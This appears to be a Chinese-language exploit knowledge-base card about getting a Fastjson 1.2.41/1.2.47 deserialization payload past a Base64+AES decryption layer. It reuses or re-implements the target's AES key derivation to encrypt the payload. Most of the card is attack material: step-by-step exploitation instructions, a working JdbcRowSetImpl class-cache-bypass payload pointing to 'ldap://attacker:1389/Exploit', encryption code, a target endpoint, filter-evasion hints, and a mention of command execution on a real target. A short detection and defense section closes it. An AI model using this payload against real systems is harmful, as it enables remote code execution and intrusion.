---
id: web-java-deser-fastjson-encrypted-param-aes-wrapper
title: Fastjson 加密参数入口：复用目标 AES 工具加密 payload 通过 Base64+AES 解密层
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-encrypted-param-aes-wrapper
tags:
- java
- fastjson
- deserialization
- aes
- base64
- encryption-wrapper
- jndi
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 1.2.41（原文目标源码依赖）；1.2.47（原文 POC）
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:23:26+08:00'
  notes: 已修正并复核：密钥派生已改为 MD5 digestHex 32 字符十六进制串 getBytes（32 字节，AES-256），本地等价实现与原文 img 07 的 SecretKeySpec(MD5.create().digestHex(...).toLowerCase().getBytes(),"AES") 一致；其余场景（/admin/smsCode/send、Base64→aesDecrypt→JSON.parseObject、1.2.41 依赖、1.2.47 POC）此前已核对无误
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-encrypted-param-aes-wrapper/
draft: false
kb_aliases:
- Fastjson AES 加密入口
- EncryptUtil.aesEncrypt 复用
- Base64+AES 后的 JSON.parseObject
- 加密参数反序列化
- fastjson 1.2.41 加密接口利用
---

## 一句话结论

当 `JSON.parseObject` 位于 Base64 解码 + AES 解密之后时，普通 Fastjson payload 因解密失败到不了 sink；从源码/反编译中拿到目标的 `EncryptUtil.aesEncrypt`（AES/ECB/PKCS5Padding，密钥由 MD5 派生）后，先用它加密 Fastjson JSON 再做 Base64，即可正常通过解密层触发反序列化。

## 原理

- 目标接口形如：`param` → `Base64.getDecoder().decode(param)` → `EncryptsUtil.aesDecrypt(...)` → `JSON.parseObject(data)`。任何直接提交的 JSON 在解密阶段就会失败（或被判空返回业务异常）。
- 加密层不是安全边界，只是编码/保密包装；只要知道算法与密钥，攻击者可以生成合法密文。源码泄露、反编译 jar 或本地依赖都能提供 `EncryptUtil`。
- 本例的 `EncryptUtil`：`AES_KEY` 为固定字符串，算法 `AES/ECB/PKCS5Padding`，`aesEncryptToBytes` 用 `MD5(encryptKey).digestHex(...).toLowerCase()` 生成 32 字节的十六进制字符串，`getBytes()` 后是 32 字节，对应 AES-256；`aesEncrypt` 返回 `Base64(AES(content))`。这正好与 `aesDecrypt` 对称。
- 最省事的利用方式是直接调用目标自己的加密工具类（或其等价实现）加密 payload，保证填充、密钥派生、编码完全一致；否则容易在 padding 或 key 长度上失败。
- 加密层绕过之后，剩下的就是标准 Fastjson 反序列化：本例用 1.2.47 的 `java.lang.Class` 缓存绕过把 `JdbcRowSetImpl` 写入 `TypeUtils.mappings`，再触发 JNDI；目标实际依赖为 1.2.41，同样在该绕过影响范围内。
- 之所以成立：解密结果直接进入 `JSON.parseObject`，没有任何“解密后必须为业务字段”的结构校验；攻击者只要复现加密算法即可把任意 JSON 送进解析器。

## 触发条件

- 存在 Fastjson 反序列化 sink（`JSON.parseObject`/`JSON.parse`），且位于 Base64/AES（或其他可复现的对称加密）之后；
- 能获得加密实现（源码、反编译 jar、依赖包）或推断出算法与密钥；
- Fastjson 版本存在 AutoType/缓存绕过（本例 1.2.41/1.2.47）；
- 目标可出网访问攻击者的 LDAP/RMI 服务，或存在本地 gadget 可替代 JNDI。

## 利用步骤

1. 在源码/反编译结果中搜索 `parseObject`、`JSON.parse`，定位所有 sink；对加密参数接口继续追踪解密函数。
2. 反编译 `EncryptUtil`，确认算法、mode/padding、密钥来源（固定 key、MD5 派生、配置项）。
3. 构造 Fastjson 1.2.47 类缓存绕过 payload（`java.lang.Class` 预置 `JdbcRowSetImpl`，第二个对象引用它并设置 `dataSourceName`）。
4. 用目标的 `aesEncrypt(json)`（或按同样算法本地实现）加密，得到 Base64 字符串。
5. 将 Base64 作为参数提交到加密接口；先用 Dnslog/JNDI 探测确认到达 sink，再换命令执行。
6. 若目标仅能 DNS 出网，改用不依赖远程类加载的本地 gadget 或其它 sink。

## PoC

```java
// 1) Fastjson 1.2.47 类缓存 payload（@type 可用 p 等转义规避简单匹配）
String exp = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
           + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
           + "\"dataSourceName\":\"ldap://attacker:1389/Exploit\",\"autoCommit\":true}}";

// 2) 复用目标加密工具（EncryptUtil.aesEncrypt = Base64(AES/ECB/PKCS5Padding, key=MD5(AES_KEY)))
String param = EncryptUtil.aesEncrypt(exp);

// 3) 提交
// POST /admin/smsCode/send
// Content-Type: application/x-www-form-urlencoded
// param=<URL 编码后的 param>
```

本地等价实现（无目标 jar 时）：

```java
byte[] md5 = MessageDigest.getInstance("MD5").digest(AES_KEY.getBytes(StandardCharsets.UTF_8));
StringBuilder hex = new StringBuilder();
for (byte b : md5) hex.append(String.format("%02x", b));
byte[] key = hex.toString().getBytes(StandardCharsets.UTF_8); // 32 字节 -> AES-256
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"));
String param = Base64.getEncoder().encodeToString(c.doFinal(exp.getBytes("UTF-8")));
```

## 变体与关联

- 加密层变体：自定义 AES（CBC/ECB、不同 padding）、RSA、SM4、双重 Base64、URL 编码；核心都是“复现加密算法后把 payload 送进 sink”。
- sink 变体：除 `JSON.parseObject` 外，`ObjectInputStream`、XStream、Jackson 等位于解密层之后时同理。
- Fastjson 版本变体：1.2.47 类缓存绕过见独立卡片；更高版本可考虑 expectClass/异常缓存等绕过。
- 关联：[[web-java-deser-fastjson-1247-class-cache-bypass]]（本卡使用的 payload 机制）；[[web-java-deser-fastjson-jdbc-rowset]]（JdbcRowSetImpl JNDI sink）；[[web-java-deser-fastjson-recon-version-dependency-probe]]（版本探测）。
- 影响边界：本例在本地与真实目标均执行 `ifconfig`/`id` 成功；若目标仅 DNS 出网，需另找不出网 gadget，或利用环境差异（JDK 版本、WAF、容器）做进一步绕过。

## 检测与防御

- 检测：请求参数为 Base64 且解码后为高熵二进制/AES 密文；解密后出现 `@type`、`java.lang.Class`、`JdbcRowSetImpl` 等 Fastjson 特征；JNDI/LDAP/RMI 出站；`parseObject` 调用点前后出现异常解密失败。
- 修复：升级 Fastjson 并开启 SafeMode/关闭 AutoType；不要用固定密钥的对称加密作为唯一输入保护；解密后对 JSON 做严格 schema/字段白名单校验。
- 缓解：网络层限制 JNDI/LDAP/RMI 出站；WAF 对解密后的内容（而非仅密文）做检测；密钥轮换并避免硬编码在客户端可获取的 jar 中。
